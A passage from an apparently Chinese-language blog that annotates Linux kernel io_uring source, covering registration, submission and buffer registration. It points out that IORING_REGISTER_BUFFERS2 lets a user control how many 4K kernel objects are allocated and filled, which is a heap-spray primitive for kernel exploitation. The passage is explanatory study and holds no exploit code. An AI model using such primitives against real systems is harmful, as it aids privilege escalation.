class="line"></span><br><span class="line">	<span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_SQE128)</span><br><span class="line">		size = array_size(<span class="number">2</span> * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_sqe), p-&gt;sq_entries);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		size = array_size(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_sqe), p-&gt;sq_entries);</span><br><span class="line">	<span class="keyword">if</span> (size == SIZE_MAX) &#123;</span><br><span class="line">		io_rings_free(ctx);</span><br><span class="line">		<span class="keyword">return</span> -EOVERFLOW;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(&amp;rd, <span class="number">0</span>, <span class="keyword">sizeof</span>(rd));</span><br><span class="line">	rd.size = PAGE_ALIGN(size);</span><br><span class="line">	<span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_NO_MMAP) &#123;</span><br><span class="line">		rd.user_addr = p-&gt;sq_off.user_addr;</span><br><span class="line">		rd.flags |= IORING_MEM_REGION_TYPE_USER;</span><br><span class="line">	&#125;</span><br><span class="line">	ret = io_create_region(ctx, &amp;ctx-&gt;sq_region, &amp;rd, IORING_OFF_SQES);</span><br><span class="line">	<span class="keyword">if</span> (ret) &#123;</span><br><span class="line">		io_rings_free(ctx);</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line">	&#125;</span><br><span class="line">	ctx-&gt;sq_sqes = io_region_get_ptr(&amp;ctx-&gt;sq_region);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="io-uring-register"><a href="#io-uring-register" class="headerlink" title="io_uring_register()"></a>io_uring_register()</h3><p>定义了相关 syscall，调用了函数 __io_uring_register。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL_DEFINE4(io_uring_register, <span class="type">unsigned</span> <span class="type">int</span>, fd, <span class="type">unsigned</span> <span class="type">int</span>, opcode,</span><br><span class="line">		<span class="type">void</span> __user *, arg, <span class="type">unsigned</span> <span class="type">int</span>, nr_args)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_ring_ctx</span> *<span class="title">ctx</span>;</span></span><br><span class="line">	<span class="type">long</span> ret = -EBADF;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">	<span class="type">bool</span> use_registered_ring;</span><br><span class="line"></span><br><span class="line">	use_registered_ring = !!(opcode &amp; IORING_REGISTER_USE_REGISTERED_RING);</span><br><span class="line">	opcode &amp;= ~IORING_REGISTER_USE_REGISTERED_RING;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (opcode &gt;= IORING_REGISTER_LAST)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">		<span class="keyword">return</span> io_uring_register_blind(opcode, arg, nr_args);</span><br><span class="line"></span><br><span class="line">	file = io_uring_register_get_file(fd, use_registered_ring);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(file))</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(file);</span><br><span class="line">	ctx = file-&gt;private_data;</span><br><span class="line"></span><br><span class="line">	mutex_lock(&amp;ctx-&gt;uring_lock);</span><br><span class="line">	ret = __io_uring_register(ctx, opcode, arg, nr_args);</span><br><span class="line"></span><br><span class="line">	trace_io_uring_register(ctx, opcode, ctx-&gt;file_table.data.nr,</span><br><span class="line">				ctx-&gt;buf_table.nr, ret);</span><br><span class="line">	mutex_unlock(&amp;ctx-&gt;uring_lock);</span><br><span class="line"></span><br><span class="line">	fput(file);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>__io_uring_register 函数内容如下，根据 opcode 定义了各种对 io_uring的操作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __io_uring_register(<span class="keyword">struct</span> io_ring_ctx *ctx, <span class="type">unsigned</span> opcode,</span><br><span class="line">			       <span class="type">void</span> __user *arg, <span class="type">unsigned</span> nr_args)</span><br><span class="line">	__releases(ctx-&gt;uring_lock)</span><br><span class="line">	__acquires(ctx-&gt;uring_lock)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We don&#x27;t quiesce the refs for register anymore and so it can&#x27;t be</span></span><br><span class="line"><span class="comment">	 * dying as we&#x27;re holding a file ref here.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (WARN_ON_ONCE(percpu_ref_is_dying(&amp;ctx-&gt;refs)))</span><br><span class="line">		<span class="keyword">return</span> -ENXIO;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ctx-&gt;submitter_task &amp;&amp; ctx-&gt;submitter_task != current)</span><br><span class="line">		<span class="keyword">return</span> -EEXIST;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ctx-&gt;restricted) &#123;</span><br><span class="line">		opcode = array_index_nospec(opcode, IORING_REGISTER_LAST);</span><br><span class="line">		<span class="keyword">if</span> (!test_bit(opcode, ctx-&gt;restrictions.register_op))</span><br><span class="line">			<span class="keyword">return</span> -EACCES;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">	<span class="keyword">case</span> IORING_REGISTER_BUFFERS:</span><br><span class="line">		ret = -EFAULT;</span><br><span class="line">		<span class="keyword">if</span> (!arg)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		ret = io_sqe_buffers_register(ctx, arg, nr_args, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> IORING_UNREGISTER_BUFFERS:</span><br><span class="line">		ret = -EINVAL;</span><br><span class="line">		<span class="keyword">if</span> (arg || nr_args)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		ret = io_sqe_buffers_unregister(ctx);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> IORING_REGISTER_FILES:</span><br><span class="line">		ret = -EFAULT;</span><br><span class="line">		<span class="keyword">if</span> (!arg)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		ret = io_sqe_files_register(ctx, arg, nr_args, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure>

<h3 id="io-uring-enter"><a href="#io-uring-enter" class="headerlink" title="io_uring_enter()"></a>io_uring_enter()</h3><p>用户空间进程可以通过 <code>io_uring_enter()</code> 提交新的 I&#x2F;O 请求（告诉内核我们已经在 SQ 队列提交了 SQE），且可以选择是否等待 I&#x2F;O 完成等选项，内核会随后进行处理</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL_DEFINE6(io_uring_enter, <span class="type">unsigned</span> <span class="type">int</span>, fd, u32, to_submit,</span><br><span class="line">		u32, min_complete, u32, flags, <span class="type">const</span> <span class="type">void</span> __user *, argp,</span><br><span class="line">		<span class="type">size_t</span>, argsz)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_ring_ctx</span> *<span class="title">ctx</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">	<span class="type">long</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(flags &amp; ~(IORING_ENTER_GETEVENTS | IORING_ENTER_SQ_WAKEUP |</span><br><span class="line">			       IORING_ENTER_SQ_WAIT | IORING_ENTER_EXT_ARG |</span><br><span class="line">			       IORING_ENTER_REGISTERED_RING |</span><br><span class="line">			       IORING_ENTER_ABS_TIMER |</span><br><span class="line">			       IORING_ENTER_EXT_ARG_REG |</span><br><span class="line">			       IORING_ENTER_NO_IOWAIT)))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Ring fd has been registered via IORING_REGISTER_RING_FDS, we</span></span><br><span class="line"><span class="comment">	 * need only dereference our task private array to find it.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; IORING_ENTER_REGISTERED_RING) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_task</span> *<span class="title">tctx</span> =</span> current-&gt;io_uring;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (unlikely(!tctx || fd &gt;= IO_RINGFD_REG_MAX))</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		fd = array_index_nospec(fd, IO_RINGFD_REG_MAX);</span><br><span class="line">		file = tctx-&gt;registered_rings[fd];</span><br><span class="line">		<span class="keyword">if</span> (unlikely(!file))</span><br><span class="line">			<span class="keyword">return</span> -EBADF;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		file = fget(fd);</span><br><span class="line">		<span class="keyword">if</span> (unlikely(!file))</span><br><span class="line">			<span class="keyword">return</span> -EBADF;</span><br><span class="line">		ret = -EOPNOTSUPP;</span><br><span class="line">		<span class="keyword">if</span> (unlikely(!io_is_uring_fops(file)))</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ctx = file-&gt;private_data;</span><br><span class="line">	ret = -EBADFD;</span><br><span class="line">	<span class="keyword">if</span> (unlikely(ctx-&gt;flags &amp; IORING_SETUP_R_DISABLED))</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * For SQ polling, the thread will do all submissions and completions.</span></span><br><span class="line"><span class="comment">	 * Just return the requested submit count, and wake the thread if</span></span><br><span class="line"><span class="comment">	 * we were asked to.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	ret = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_SQPOLL) &#123;</span><br><span class="line">		<span class="keyword">if</span> (unlikely(ctx-&gt;sq_data-&gt;thread == <span class="literal">NULL</span>)) &#123;</span><br><span class="line">			ret = -EOWNERDEAD;</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (flags &amp; IORING_ENTER_SQ_WAKEUP)</span><br><span class="line">			wake_up(&amp;ctx-&gt;sq_data-&gt;wait);</span><br><span class="line">		<span class="keyword">if</span> (flags &amp; IORING_ENTER_SQ_WAIT)</span><br><span class="line">			io_sqpoll_wait_sq(ctx);</span><br><span class="line"></span><br><span class="line">		ret = to_submit;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (to_submit) &#123;</span><br><span class="line">		ret = io_uring_add_tctx_node(ctx);</span><br><span class="line">		<span class="keyword">if</span> (unlikely(ret))</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">		mutex_lock(&amp;ctx-&gt;uring_lock);</span><br><span class="line">		ret = io_submit_sqes(ctx, to_submit);</span><br><span class="line">		<span class="keyword">if</span> (ret != to_submit) &#123;</span><br><span class="line">			mutex_unlock(&amp;ctx-&gt;uring_lock);</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (flags &amp; IORING_ENTER_GETEVENTS) &#123;</span><br><span class="line">			<span class="keyword">if</span> (ctx-&gt;syscall_iopoll)</span><br><span class="line">				<span class="keyword">goto</span> iopoll_locked;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Ignore errors, we&#x27;ll soon call io_cqring_wait() and</span></span><br><span class="line"><span class="comment">			 * it should handle ownership problems if any.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_DEFER_TASKRUN)</span><br><span class="line">				(<span class="type">void</span>)io_run_local_work_locked(ctx, min_complete);</span><br><span class="line">		&#125;</span><br><span class="line">		mutex_unlock(&amp;ctx-&gt;uring_lock);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; IORING_ENTER_GETEVENTS) &#123;</span><br><span class="line">        <span class="comment">// 等待完成事件</span></span><br><span class="line">		<span class="type">int</span> ret2;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (ctx-&gt;syscall_iopoll) &#123;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * We disallow the app entering submit/complete with</span></span><br><span class="line"><span class="comment">			 * polling, but we still need to lock the ring to</span></span><br><span class="line"><span class="comment">			 * prevent racing with polled issue that got punted to</span></span><br><span class="line"><span class="comment">			 * a workqueue.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			mutex_lock(&amp;ctx-&gt;uring_lock);</span><br><span class="line">iopoll_locked:</span><br><span class="line">			ret2 = io_validate_ext_arg(ctx, flags, argp, argsz);</span><br><span class="line">			<span class="keyword">if</span> (likely(!ret2))</span><br><span class="line">				ret2 = io_iopoll_check(ctx, min_complete);</span><br><span class="line">			mutex_unlock(&amp;ctx-&gt;uring_lock);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">struct</span> ext_arg ext_arg = &#123; .argsz = argsz &#125;;</span><br><span class="line"></span><br><span class="line">			ret2 = io_get_ext_arg(ctx, flags, argp, &amp;ext_arg);</span><br><span class="line">			<span class="keyword">if</span> (likely(!ret2))</span><br><span class="line">				ret2 = io_cqring_wait(ctx, min_complete, flags,</span><br><span class="line">						      &amp;ext_arg);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!ret) &#123;</span><br><span class="line">			ret = ret2;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * EBADR indicates that one or more CQE were dropped.</span></span><br><span class="line"><span class="comment">			 * Once the user has been informed we can clear the bit</span></span><br><span class="line"><span class="comment">			 * as they are obviously ok with those drops.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> (unlikely(ret2 == -EBADR))</span><br><span class="line">				clear_bit(IO_CHECK_CQ_DROPPED_BIT,</span><br><span class="line">					  &amp;ctx-&gt;check_cq);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">if</span> (!(flags &amp; IORING_ENTER_REGISTERED_RING))</span><br><span class="line">		fput(file);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="IORING-REGISTER-PBUF-RING"><a href="#IORING-REGISTER-PBUF-RING" class="headerlink" title="IORING_REGISTER_PBUF_RING"></a>IORING_REGISTER_PBUF_RING</h2><p><a href="2025-10-13-CVE-2024-0582%E5%AD%A6%E4%B9%A0.md">CVE-2024-0582学习</a></p>
<h2 id="IORING-REGISTER-BUFFERS2"><a href="#IORING-REGISTER-BUFFERS2" class="headerlink" title="IORING_REGISTER_BUFFERS2"></a>IORING_REGISTER_BUFFERS2</h2><p>在获取一个 io_uring 上下文后，我们可以通过 io_uring_register() 系统调用分配一些内核空间并写入数据，这里介绍 <code>IORING_REGISTER_BUFFERS2</code> opcode：</p>
<ul>
<li>IORING_REGISTER_BUFFERS2：将多个缓冲区提前注册到内核中，供后续直接使用而无需重复传递分配释放<br>其本身的原始功能对我们而言是次要的，但其内部实现对我们而言有很多利用点。</li>
</ul>
<h3 id="分配（GFP-KERNEL-ACCOUNT）"><a href="#分配（GFP-KERNEL-ACCOUNT）" class="headerlink" title="分配（GFP_KERNEL_ACCOUNT）"></a>分配（GFP_KERNEL_ACCOUNT）</h3><p>当我们指定 opcode 为 IORING_REGISTER_BUFFERS2 时，内核 io_uring_register 系统调用会执行 io_register_rsrc() 函数，参数则会交由 io_seq_buffers_register() 进行处理：</p>
<blockquote>
<p>注：6.13 版本后便不再使用 io_alloc_page_table 函数进行页面内存的分配</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> __cold <span class="type">void</span> **<span class="title function_">io_alloc_page_table</span><span class="params">(<span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> i, nr_tables = DIV_ROUND_UP(size, PAGE_SIZE);</span><br><span class="line">	<span class="type">size_t</span> init_size = size;</span><br><span class="line">	<span class="type">void</span> **table;</span><br><span class="line"></span><br><span class="line">	table = kcalloc(nr_tables, <span class="keyword">sizeof</span>(*table), GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (!table)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nr_tables; i++) &#123;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> this_size = <span class="type">min_t</span>(<span class="type">size_t</span>, size, PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">		table[i] = kzalloc(this_size, GFP_KERNEL_ACCOUNT);</span><br><span class="line">		<span class="keyword">if</span> (!table[i]) &#123;</span><br><span class="line">			io_free_page_table(table, init_size);</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		size -= this_size;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> table;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__cold <span class="type">static</span> <span class="type">int</span> <span class="title function_">io_rsrc_data_alloc</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx,</span></span><br><span class="line"><span class="params">				     rsrc_put_fn *do_put, u64 __user *utags,</span></span><br><span class="line"><span class="params">				     <span class="type">unsigned</span> nr, <span class="keyword">struct</span> io_rsrc_data **pdata)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_rsrc_data</span> *<span class="title">data</span>;</span></span><br><span class="line">	<span class="type">int</span> ret = -ENOMEM;</span><br><span class="line">	<span class="type">unsigned</span> i;</span><br><span class="line"></span><br><span class="line">	data = kzalloc(<span class="keyword">sizeof</span>(*data), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!data)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	data-&gt;tags = (u64 **)io_alloc_page_table(nr * <span class="keyword">sizeof</span>(data-&gt;tags[<span class="number">0</span>][<span class="number">0</span>]));</span><br><span class="line">	<span class="keyword">if</span> (!data-&gt;tags) &#123;</span><br><span class="line">		kfree(data);</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	data-&gt;nr = nr;</span><br><span class="line">	data-&gt;ctx = ctx;</span><br><span class="line">	data-&gt;do_put = do_put;</span><br><span class="line">	<span class="keyword">if</span> (utags) &#123;</span><br><span class="line">		ret = -EFAULT;</span><br><span class="line">		<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nr; i++) &#123;</span><br><span class="line">			u64 *tag_slot = io_get_tag_slot(data, i);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (copy_from_user(tag_slot, &amp;utags[i],</span><br><span class="line">					   <span class="keyword">sizeof</span>(*tag_slot)))</span><br><span class="line">				<span class="keyword">goto</span> fail;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">atomic_set</span>(&amp;data-&gt;refs, <span class="number">1</span>);</span><br><span class="line">	init_completion(&amp;data-&gt;done);</span><br><span class="line">	*pdata = data;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">fail:</span><br><span class="line">	io_rsrc_data_free(data);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">io_sqe_buffers_register</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx, <span class="type">void</span> __user *arg,</span></span><br><span class="line"><span class="params">			    <span class="type">unsigned</span> <span class="type">int</span> nr_args, u64 __user *tags)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">last_hpage</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_rsrc_data</span> *<span class="title">data</span>;</span></span><br><span class="line">	<span class="type">int</span> i, ret;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span>;</span></span><br><span class="line"></span><br><span class="line">	BUILD_BUG_ON(IORING_MAX_REG_BUFFERS &gt;= (<span class="number">1u</span> &lt;&lt; <span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ctx-&gt;user_bufs)</span><br><span class="line">		<span class="keyword">return</span> -EBUSY;</span><br><span class="line">	<span class="keyword">if</span> (!nr_args || nr_args &gt; IORING_MAX_REG_BUFFERS)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	ret = io_rsrc_node_switch_start(ctx);</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line">	ret = io_rsrc_data_alloc(ctx, io_rsrc_buf_put, tags, nr_args, &amp;data);</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line">	ret = io_buffers_map_alloc(ctx, nr_args);</span><br><span class="line">	<span class="keyword">if</span> (ret) &#123;</span><br><span class="line">		io_rsrc_data_free(data);</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nr_args; i++, ctx-&gt;nr_user_bufs++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (arg) &#123;</span><br><span class="line">			ret = io_copy_iov(ctx, &amp;iov, arg, i);</span><br><span class="line">			<span class="keyword">if</span> (ret)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			ret = io_buffer_validate(&amp;iov);</span><br><span class="line">			<span class="keyword">if</span> (ret)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">memset</span>(&amp;iov, <span class="number">0</span>, <span class="keyword">sizeof</span>(iov));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!iov.iov_base &amp;&amp; *io_get_tag_slot(data, i)) &#123;</span><br><span class="line">			ret = -EINVAL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ret = io_sqe_buffer_register(ctx, &amp;iov, &amp;ctx-&gt;user_bufs[i],</span><br><span class="line">					     &amp;last_hpage);</span><br><span class="line">		<span class="keyword">if</span> (ret)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	WARN_ON_ONCE(ctx-&gt;buf_data);</span><br><span class="line"></span><br><span class="line">	ctx-&gt;buf_data = data;</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		__io_sqe_buffers_unregister(ctx);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		io_rsrc_node_switch(ctx, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__cold <span class="type">int</span> <span class="title function_">io_register_rsrc</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx, <span class="type">void</span> __user *arg,</span></span><br><span class="line"><span class="params">			    <span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">unsigned</span> <span class="type">int</span> type)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_rsrc_register</span> <span class="title">rr</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* keep it extendible */</span></span><br><span class="line">	<span class="keyword">if</span> (size != <span class="keyword">sizeof</span>(rr))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(&amp;rr, <span class="number">0</span>, <span class="keyword">sizeof</span>(rr));</span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(&amp;rr, arg, size))</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	<span class="keyword">if</span> (!rr.nr || rr.resv2)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (rr.flags &amp; ~IORING_RSRC_REGISTER_SPARSE)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (type) &#123;</span><br><span class="line">	<span class="keyword">case</span> IORING_RSRC_FILE:</span><br><span class="line">		<span class="keyword">if</span> (rr.flags &amp; IORING_RSRC_REGISTER_SPARSE &amp;&amp; rr.data)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">return</span> io_sqe_files_register(ctx, u64_to_user_ptr(rr.data),</span><br><span class="line">					     rr.nr, u64_to_user_ptr(rr.tags));</span><br><span class="line">	<span class="keyword">case</span> IORING_RSRC_BUFFER:</span><br><span class="line">		<span class="keyword">if</span> (rr.flags &amp; IORING_RSRC_REGISTER_SPARSE &amp;&amp; rr.data)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">return</span> io_sqe_buffers_register(ctx, u64_to_user_ptr(rr.data),	<span class="comment">// 对应 IORING_REGISTER_BUFFERS2 opcode</span></span><br><span class="line">					       rr.nr, u64_to_user_ptr(rr.tags));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>调用 io_rsrc_data_alloc 函数分配一个 io_rsrc_data 结构体，大小为80，flag 为 GFP_KERNEL，从 kmalloc-96 中取。</li>
<li>调用 io_alloc_page_table 函数分配指针数组，可以根据传入的 size 分配对应数量大小为 4k 的内核对象，分配 flag 为 GFP_KERNEL_ACCOUNT</li>
</ul>
<p>这里 size 是我们用户可控的，因此可以通过控制 size 来控制指针数组大小以及分配的 4k 内核对象数量：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> __cold <span class="type">void</span> **<span class="title function_">io_alloc_page_table</span><span class="params">(<span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> i, nr_tables = DIV_ROUND_UP(size, PAGE_SIZE);</span><br><span class="line">	<span class="type">size_t</span> init_size = size;</span><br><span class="line">	<span class="type">void</span> **table;</span><br><span class="line"></span><br><span class="line">	table = kcalloc(nr_tables, <span class="keyword">sizeof</span>(*table), GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (!table)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nr_tables; i++) &#123;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> this_size = <span class="type">min_t</span>(<span class="type">size_t</span>, size, PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">		table[i] = kzalloc(this_size, GFP_KERNEL_ACCOUNT);</span><br><span class="line">		<span class="keyword">if</span> (!table[i]) &#123;</span><br><span class="line">			io_free_page_table(table, init_size);</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		size -= this_size;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> table;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>完成内存分配后进行数据拷贝，4k 内核对象可以全部存储来自用户空间的数据：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__cold <span class="type">static</span> <span class="type">int</span> <span class="title function_">io_rsrc_data_alloc</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx,</span></span><br><span class="line"><span class="params">				     rsrc_put_fn *do_put, u64 __user *utags,</span></span><br><span class="line"><span class="params">				     <span class="type">unsigned</span> nr, <span class="keyword">struct</span> io_rsrc_data **pdata)</span></span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	data-&gt;nr = nr;</span><br><span class="line">	data-&gt;ctx = ctx;</span><br><span class="line">	data-&gt;do_put = do_put;</span><br><span class="line">	<span class="keyword">if</span> (utags) &#123;</span><br><span class="line">		ret = -EFAULT;</span><br><span class="line">		<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nr; i++) &#123;</span><br><span class="line">			u64 *tag_slot = io_get_tag_slot(data, 